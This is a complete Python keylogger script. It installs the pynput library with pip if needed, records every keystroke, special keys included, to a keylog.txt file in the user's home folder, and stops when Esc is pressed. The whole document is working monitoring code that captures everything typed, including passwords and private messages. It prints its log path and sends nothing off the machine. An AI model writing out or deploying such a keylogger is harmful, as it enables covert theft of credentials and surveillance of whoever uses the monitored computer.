import subprocess
import sys
import os

# Function to install a package using pip
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Try to import pynput,
try:
    from pynput import keyboard
except ImportError:
    print("pynput module not found. Installing...")
    install('pynput')
    from pynput import keyboard

# Define path where keystrokes will going to pasted
log_file_path = os.path.join(os.path.expanduser("~"), 'keylog.txt')

print(f"Logging keystrokes to: {log_file_path}")

def on_press(key):
    try:
        # Write the key to the log file
        with open(log_file_path, 'a') as log_file:
            log_file.write(f'{key.char}')
    except AttributeError:
        # Handle special keys
        with open(log_file_path, 'a') as log_file:
            log_file.write(f'[{key}]')

def on_release(key):
    # Stop listener if the 'esc' key is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening to the keyboard events
print("Starting keylogger...")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()